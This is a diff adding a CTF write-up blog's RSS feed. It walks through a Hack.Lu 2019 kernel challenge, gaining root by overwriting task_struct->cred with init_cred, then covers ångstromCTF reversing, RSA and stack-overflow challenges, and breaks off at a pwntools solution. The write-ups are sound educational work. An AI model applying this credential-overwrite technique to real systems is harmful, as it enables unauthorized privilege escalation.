@@ -1,0 +1,1485 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on </title>
+        <link>https://asimuntis.github.io/posts/</link>
+        <description>Recent content in Posts on </description>
+        <generator>Hugo -- gohugo.io</generator>
+        <lastBuildDate>Tue, 29 Oct 2019 20:38:02 +0000</lastBuildDate>
+        <atom:link href="https://asimuntis.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hack.Lu CTF 2019: Baby kernel 2</title>
+            <link>https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/</link>
+            <pubDate>Tue, 29 Oct 2019 20:38:02 +0000</pubDate>
+            
+            <guid>https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/</guid>
+            <description>Baby Kernel 2 - pwn , 202 pts, solves: 68 
+This post is a follow up to a quick writeup that I&amp;rsquo;ve posted on my github.
+We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.
+Having read/write primitive in kernel space we can escalate our privileges by changing cred field of the task_struct of our current task. Provided System.map file contains all symbols from the target kernel:</description>
+            <content type="html"><![CDATA[
+
+<h2 id="baby-kernel-2-pwn-202-pts-solves-68">Baby Kernel 2 - pwn , 202 pts, solves: 68</h2>
+
+<p><br>
+This post is a follow up to a quick <a href="https://github.com/asimuntis/writeups/blob/master/hack.lu-2019/baby-kernel-2.md" target="_blank">writeup</a> that I&rsquo;ve posted on my github.</p>
+
+<p>We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.</p>
+
+<p>Having <code>read/write</code> primitive in kernel space we can escalate our privileges by changing <code>cred</code> field of the <code>task_struct</code> of our current task. Provided <code>System.map</code> file contains all symbols from the target kernel:</p>
+
+<p>Obtaining <code>current_task</code> address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ grep <span style="color:#e6db74">&#39;D current_task&#39;</span> System.map  
+ffffffff8183a040 D current_task</code></pre></div>
+<p>Alternatively, we can read symbols directly from the kernel image:<br />
+(I have used <a href="https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux" target="_blank">this</a> tool to decompress the kernel image.)</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep current_task
+ <span style="color:#ae81ff">2165</span>: ffffffff816d4df0     <span style="color:#ae81ff">0</span> NOTYPE  LOCAL  DEFAULT    <span style="color:#ae81ff">6</span> __ksymtab_current_task
+ <span style="color:#ae81ff">2166</span>: ffffffff816db115    <span style="color:#ae81ff">13</span> OBJECT  LOCAL  DEFAULT    <span style="color:#ae81ff">8</span> __kstrtab_current_task
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#ae81ff">20328</span>: ffffffff8183a040     <span style="color:#ae81ff">8</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> current_task</span></code></pre></div>
+
+<p>Let&rsquo;s test if we can read from the <code>current_task</code> address:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hl_lines=16" data-lang="hl_lines=16">----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 1
+1
+I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040
+0xffffffff8183a040
+Got everything I need. Let&#39;s do it!
+flux_baby_2 ioctl nr 901 called
+We&#39;re back. Our scouter says the power level is: ffff888003372300</code></pre></div>
+
+<p>We have obtained <code>task_struct</code> address from the <code>current_task</code>. Now we have to get the offset to the <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>):</p>
+
+<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/sched.h#L624" target="_blank">linux/sched.h#L624</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> task_struct {
+
+	(...)
+	
+	<span style="color:#75715e">/* Objective and real subjective task credentials (COW): */</span>
+	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>real_cred;
+
+	<span style="color:#75715e">/* Effective (overridable) subjective task credentials (COW): */</span>
+	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>cred;</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> task_struct
+<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> task_struct {
+<span style="color:#75715e">/*    0      |    16 */</span>    <span style="color:#66d9ef">struct</span> thread_info {
+<span style="color:#75715e">/*    0      |     8 */</span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;
+
+...
+
+<span style="color:#75715e">/* 1016      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>real_cred;
+<span style="color:#75715e">/* 1024      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>cred;</code></pre></div>
+<p>To escalate privileges to root we have to overwrite <code>task_struct-&gt;cred</code> at offset <code>0x400</code> (1024) with the the pointer to the <code>init_cred</code> struct, which contains credentials of the <code>init</code> process that is running as <code>root</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep init_cred      
+ <span style="color:#ae81ff">21812</span>: ffffffff8183f4c0   <span style="color:#ae81ff">120</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> init_cred</code></pre></div>
+<p><mark><a href="https://github.com/torvalds/linux/blob/39a38bcba4ab6e5285b07675b0e42c96eec35e67/kernel/cred.c#L41" target="_blank">kernel/cred.c#L41</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * The initial credentials for the initial task
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">struct</span> cred init_cred <span style="color:#f92672">=</span> {
+	.usage			<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">4</span>),
+<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span style="color:#75715e"></span>	.subscribers		<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">2</span>),
+	.magic			<span style="color:#f92672">=</span> CRED_MAGIC,
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>	.uid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.gid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.suid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.sgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.euid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.egid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.fsuid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.fsgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,</code></pre></div>
+<p><kds>The final plan:</kdb></p>
+
+<ul class="task-list">
+<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct</code> from <code>current_task</code></label></li>
+<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>) from <code>task_struct + 0x400</code></label></li>
+<li><label><input type="checkbox" checked disabled class="task-list-item"> overwrite <code>task_struct-&gt;cred</code> with <code>init_cred</code></label></li>
+</ul>
+
+<p>What is left to do is to spawn a shell with the new credentials - or like in our case, just use <code>Read file</code> function that is now running with <code>root</code> pivileges:</p>
+
+<pre><code>----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 1
+1
+I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040 &lt;- current_task
+0xffffffff8183a040
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003373480 &lt;- task_struct
+</code></pre>
+
+<blockquote>
+<p>task_struct @ 0xffff888003373480<br />
+task_struct-&gt;cred @ 0xffff888003373480+0x400</p>
+</blockquote>
+
+<pre><code>----- Menu -----
+1. Readrandom: fast init done
+
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 2
+2
+I need an offset to write to. Choose wisely - seriously now...
+&gt; 
+0xffff888003373880     &lt;-- task_struct-&gt;cred
+0xffff888003373880
+What about a value?
+&gt; 
+0xffffffff8183f4c0     &lt;-- init_cred
+0xffffffff8183f4c0
+Thanks, boss. I can't believe we're doing this!
+flux_baby_2 ioctl nr 902 called
+Amazingly, we're back again.
+</code></pre>
+
+<blockquote>
+<p>task_struct-&gt;cred = init_cred</p>
+</blockquote>
+
+<pre><code>----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 3
+3
+uid=0(root) gid=0(root)
+
+----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 4 
+4 
+Which file are we trying to read?
+&gt; /flag
+/flag
+Here are your 0x35 bytes contents: 
+flag{nicely_done_this_is_how_a_privesc_can_also_go}}
+</code></pre>
+
+<h2 id="alternative-approach">Alternative approach</h2>
+
+<p>Instead of pointing the <code>task_struct-&gt;cred</code> to the <code>init_cred</code>, we could manually modify certain fields of the <code>struct cred *cred</code>. We know that we can obtain <code>struct cred</code> address from the <code>task_struct-&gt;cred</code>.</p>
+
+<p>Let&rsquo;s redo everything step by step. <br /></p>
+
+<p>Reading <code>task_struct</code> address from <code>current_task</code>:</p>
+
+<pre><code>I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040 &lt;- current_task
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003371180 &lt;- task_struct
+</code></pre>
+
+<p>Our <code>task_struct</code> address is <code>0xffff888003371180</code>. Now we can obtain the address of the <code>struct cred *cred</code> that is referenced in the <code>task_struct</code> at offset <code>0x400</code>.  Let&rsquo;s read <code>0xffff888003371180+0x400</code></p>
+
+<pre><code>I need an address to read from. Choose wisely
+&gt; 
+0xffff888003371580 &lt;- task_struct + 0x400
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003393400 &lt;- stuct cred
+</code></pre>
+
+<p>We know that <code>struct cred *cred</code> is at <code>0xffff888003393400</code>.</p>
+
+<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h#L111" target="_blank">linux/cred.h#L111</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
+	atomic_t	usage;
+<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span style="color:#75715e"></span>	atomic_t	subscribers;	<span style="color:#75715e">/* number of processes subscribed */</span>
+	<span style="color:#66d9ef">void</span>		<span style="color:#f92672">*</span>put_addr;
+	<span style="color:#66d9ef">unsigned</span>	magic;
+<span style="color:#75715e">#define CRED_MAGIC	0x43736564
+</span><span style="color:#75715e">#define CRED_MAGIC_DEAD	0x44656144
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>	kuid_t		uid;		<span style="color:#75715e">/* real UID of the task */</span>
+	kgid_t		gid;		<span style="color:#75715e">/* real GID of the task */</span>
+	kuid_t		suid;		<span style="color:#75715e">/* saved UID of the task */</span>
+	kgid_t		sgid;		<span style="color:#75715e">/* saved GID of the task */</span>
+	kuid_t		euid;		<span style="color:#75715e">/* effective UID of the task */</span>
+	kgid_t		egid;		<span style="color:#75715e">/* effective GID of the task */</span>
+	kuid_t		fsuid;		<span style="color:#75715e">/* UID for VFS ops */</span>
+	kgid_t		fsgid;		<span style="color:#75715e">/* GID for VFS ops */</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> cred
+<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> cred {
+<span style="color:#75715e">/*    0      |     4 */</span>    atomic_t usage;
+<span style="color:#75715e">/*    4      |     4 */</span>    kuid_t uid;
+<span style="color:#75715e">/*    8      |     4 */</span>    kgid_t gid;
+<span style="color:#75715e">/*   12      |     4 */</span>    kuid_t suid;
+<span style="color:#75715e">/*   16      |     4 */</span>    kgid_t sgid;
+<span style="color:#75715e">/*   20      |     4 */</span>    kuid_t euid;
+<span style="color:#75715e">/*   24      |     4 */</span>    kgid_t egid;
+<span style="color:#75715e">/*   28      |     4 */</span>    kuid_t fsuid;
+<span style="color:#75715e">/*   32      |     4 */</span>    kgid_t fsgid;
+<span style="color:#75715e">/*   36      |     4 */</span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> securebits;
+<span style="color:#75715e">/*   40      |     8 */</span>    kernel_cap_t cap_inheritable;
+<span style="color:#75715e">/*   48      |     8 */</span>    kernel_cap_t cap_permitted;
+<span style="color:#75715e">/*   56      |     8 */</span>    kernel_cap_t cap_effective;
+<span style="color:#75715e">/*   64      |     8 */</span>    kernel_cap_t cap_bset;
+<span style="color:#75715e">/*   72      |     8 */</span>    kernel_cap_t cap_ambient;</code></pre></div>
+<p>Now we can set, for example <code>cred-&gt;uid</code> field at offset <code>4</code>, to <code>0</code> (root):</p>
+
+<pre><code>I need an offset to write to. Choose wisely - seriously now...
+&gt; 
+0xffff888003389704 &lt;- struct cred + 4
+What about a value?
+&gt; 
+0
+Thanks, boss. I can't believe we're doing this!
+flux_baby_2 ioctl nr 902 called
+Amazingly, we're back again.
+----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 3
+uid=0(root) gid=0(root) euid=1000(user) egid=1000(user) groups=1000(user)
+
+</code></pre>
+
+<p>That&rsquo;s it! Thanks</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>ångstromCTF 2019</title>
+            <link>https://asimuntis.github.io/posts/2019/04/%C3%A5ngstromctf-2019/</link>
+            <pubDate>Thu, 25 Apr 2019 00:00:00 +0000</pubDate>
+            
+            <guid>https://asimuntis.github.io/posts/2019/04/%C3%A5ngstromctf-2019/</guid>
+            <description>Reversing: One Bite [40pts] 
+Challenge binary takes input from the user; performs single byte xor with 0x3c key and then compares with the hardcoded string.
+Let&amp;rsquo;s verify it with ltrace:
+~&amp;gt; ltrace ./one_bite __libc_start_main(0x4006a6, 1, 0x7ffe30270b48, 0x400780 &amp;lt;unfinished ...&amp;gt; puts(&amp;quot;Give me a flag to eat: &amp;quot;Give me a flag to eat: ) = 24 fgets(aaaa &amp;quot;aaaa\n&amp;quot;, 34, 0x7efe4674b8e0) = 0x7ffe30270a20 strlen(&amp;quot;aaaa\n&amp;quot;) = 5 strlen(&amp;quot;]aaa\n&amp;quot;) = 5 strlen(&amp;quot;]]aa\n&amp;quot;) = 5 strlen(&amp;quot;]]]a\n&amp;quot;) = 5 strlen(&amp;quot;]]]]\n&amp;quot;) = 5 strlen(&amp;quot;]]]]6&amp;quot;) = 5 strcmp(&amp;quot;]]]]6&amp;quot;, &amp;quot;]_HZGUcHTURWcUQc[SUR[cHSc^YcOU_W&amp;quot;.</description>
+            <content type="html"><![CDATA[
+
+<h2 id="reversing">Reversing:</h2>
+
+<h3 id="one-bite-40pts">One Bite [40pts]</h3>
+
+<p><br>
+Challenge binary takes input from the user; performs single byte <code>xor</code> with <code>0x3c</code> key and then compares with the hardcoded string.</p>
+
+<p><img src="/posts/static/onebite.png" alt="" /></p>
+
+<p>Let&rsquo;s verify it with <code>ltrace</code>:</p>
+
+<pre><code>~&gt; ltrace ./one_bite
+__libc_start_main(0x4006a6, 1, 0x7ffe30270b48, 0x400780 &lt;unfinished ...&gt;
+puts(&quot;Give me a flag to eat: &quot;Give me a flag to eat: 
+)                                                                                 = 24
+fgets(aaaa
+&quot;aaaa\n&quot;, 34, 0x7efe4674b8e0)                                                                             = 0x7ffe30270a20
+strlen(&quot;aaaa\n&quot;)                                                                                                = 5
+strlen(&quot;]aaa\n&quot;)                                                                                                = 5
+strlen(&quot;]]aa\n&quot;)                                                                                                = 5
+strlen(&quot;]]]a\n&quot;)                                                                                                = 5
+strlen(&quot;]]]]\n&quot;)                                                                                                = 5
+strlen(&quot;]]]]6&quot;)                                                                                                 = 5
+strcmp(&quot;]]]]6&quot;, &quot;]_HZGUcHTURWcUQc[SUR[cHSc^YcOU_W&quot;...)                                                          = -2
+puts(&quot;That didn't taste so good :(&quot;That didn't taste so good :(
+)                                                                            = 29
++++ exited (status 0) +++
+</code></pre>
+
+<p>Solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;]_HZGUcHTURWcUQc[SUR[cHSc^YcOU_WA&#34;</span>
+flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> str:
+	flag <span style="color:#f92672">+=</span> chr(ord(i)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x3c</span>)
+
+<span style="color:#66d9ef">print</span>(flag)
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74"># result:
+</span><span style="color:#e6db74">~&gt; python onebite.py 
+</span><span style="color:#e6db74">actf{i_think_im_going_to_be_sick}
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span></code></pre></div>
+<h3 id="i-like-it-60pts">I Like It [60pts]</h3>
+
+<p>Let&rsquo;s fire IDA free and check the binary:</p>
+
+<p><img src="/posts/static/likeit1.png" alt="" /></p>
+
+<p>To pass the first check we have to input the <code>okrrrrrrr</code> string:</p>
+
+<pre><code>~&gt; ./i_like_it
+I like the string that I'm thinking of: 
+okrrrrrrr
+I said I like it like that!
+I like two integers that I'm thinking of (space separated): 
+</code></pre>
+
+<p>To pass next check we have to provide two integers and their sum must equal to <code>0x88</code> (136 decimal):</p>
+
+<p><img src="/posts/static/likeit3.png" alt="" /></p>
+
+<p>Furthermore, regarding to:</p>
+
+<p><img src="/posts/static/likeit4.png" alt="" /></p>
+
+<p>The multiplication result of the provided integers must equal to <code>0x0EC7</code> (3783 decimal).<br>
+We just have to find two integers which add up to <code>0x88</code> and the product of their multiplication is equal to <code>0x0EC7</code>.<br></p>
+
+<p>Let&rsquo;s find factors of <code>3783</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> itertools
+
+flatten_iter <span style="color:#f92672">=</span> itertools<span style="color:#f92672">.</span>chain<span style="color:#f92672">.</span>from_iterable
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">factors</span>(n):
+    <span style="color:#66d9ef">return</span> set(flatten_iter((i, n<span style="color:#f92672">//</span>i) 
+                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, int(n<span style="color:#f92672">**</span><span style="color:#ae81ff">0.5</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>))
+    
+<span style="color:#66d9ef">print</span> factors(<span style="color:#ae81ff">3783</span>)
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74"># result:
+</span><span style="color:#e6db74">~&gt; python factors.py 
+</span><span style="color:#e6db74">set([1, 3, 97, 3783, 39, 13, 1261, 291])
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span></code></pre></div>
+<p><code>97 + 39 == 136</code> and finally:</p>
+
+<pre><code>~&gt; ./i_like_it
+I like the string that I'm thinking of: 
+okrrrrrrr
+I said I like it like that!
+I like two integers that I'm thinking of (space separated): 
+39 97
+I said I like it like that!
+Flag: actf{okrrrrrrr_39_97}
+</code></pre>
+
+<h3 id="high-quality-checks-110pts">High Quality Checks [110pts]</h3>
+
+<p><br>
+The binary performs multiple checks on our input; instead of going through all the checks we can use angr framework<sup class="footnote-ref" id="fnref:1"><a href="#fn:1">1</a></sup> to automate this task and reach <code>0x400ACB</code>.</p>
+
+<p><img src="/posts/static/high.png" alt="" /></p>
+
+<p>Solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> angr
+
+WIN<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400ACB</span>
+
+s <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#39;./high_quality_checks&#39;</span>, load_options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;auto_load_libs&#39;</span>: False})
+e <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>surveyors<span style="color:#f92672">.</span>Explorer(find<span style="color:#f92672">=</span>(WIN))
+result <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>run()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>found:
+    <span style="color:#66d9ef">print</span> i<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>)
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74"># result:
+</span><span style="color:#e6db74">~&gt; python high_quality_checks.py 
+</span><span style="color:#e6db74">actf{fun_func710n5}
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span></code></pre></div>
+<h2 id="crypto">Crypto</h2>
+
+<h3 id="really-secure-algorithm-30pts">Really Secure Algorithm [30pts]</h3>
+
+<p><br>
+Straighforward RSA challenge. Knowing the primes <code>p</code> &amp; <code>q</code> along with the public exponent <code>e</code> and ciphertext <code>c</code> we can calculate<sup class="footnote-ref" id="fnref:2"><a href="#fn:2">2</a></sup> the plaintext:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> inverse
+
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span>
+
+n <span style="color:#f92672">=</span> p<span style="color:#f92672">*</span>q
+phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+
+d <span style="color:#f92672">=</span> inverse(e,phi)
+pt <span style="color:#f92672">=</span> pow(c,d,n)
+
+<span style="color:#66d9ef">print</span> hex(int(pt))[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74"># result:
+</span><span style="color:#e6db74"> ~&gt; python rsa_solve.py 
+</span><span style="color:#e6db74">actf{really_securent_algorithm}
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span> </code></pre></div>
+<h2 id="binary">Binary</h2>
+
+<h3 id="aquarium-50pts">Aquarium [50pts]</h3>
+
+<p><br>
+Vanilla stack overflow. The goal is to call <code>flag</code> function.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+	system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>);
+}
+
+<span style="color:#66d9ef">struct</span> fish_tank {
+	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">50</span>];
+	<span style="color:#66d9ef">int</span> fish;
+	<span style="color:#66d9ef">int</span> fish_size;
+	<span style="color:#66d9ef">int</span> water;
+	<span style="color:#66d9ef">int</span> width;
+	<span style="color:#66d9ef">int</span> length;
+	<span style="color:#66d9ef">int</span> height;
+};
+
+
+<span style="color:#66d9ef">struct</span> fish_tank <span style="color:#a6e22e">create_aquarium</span>() {
+	<span style="color:#66d9ef">struct</span> fish_tank tank;
+
+	printf(<span style="color:#e6db74">&#34;Enter the number of fish in your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.fish);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the size of the fish in your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.fish_size);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the amount of water in your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.water);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the width of your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.width);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the length of your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.length);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the height of your fish tank: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>tank.height);
+	getchar();
+
+	printf(<span style="color:#e6db74">&#34;Enter the name of your fish tank: &#34;</span>);
+	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">50</span>];
+	gets(name);
+
+	strcpy(name, tank.name);
+	<span style="color:#66d9ef">return</span> tank;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+	gid_t gid <span style="color:#f92672">=</span> getegid();
+	setresgid(gid, gid, gid);
+
+	setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#66d9ef">struct</span> fish_tank tank;
+
+	tank <span style="color:#f92672">=</span> create_aquarium();
+
+	<span style="color:#66d9ef">if</span> (tank.fish_size <span style="color:#f92672">*</span> tank.fish <span style="color:#f92672">+</span> tank.water <span style="color:#f92672">&gt;</span> tank.width <span style="color:#f92672">*</span> tank.height <span style="color:#f92672">*</span> tank.length) {
+		printf(<span style="color:#e6db74">&#34;Your fish tank has overflowed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+	}
+
+	printf(<span style="color:#e6db74">&#34;Nice fish tank you have there.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<p>Solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
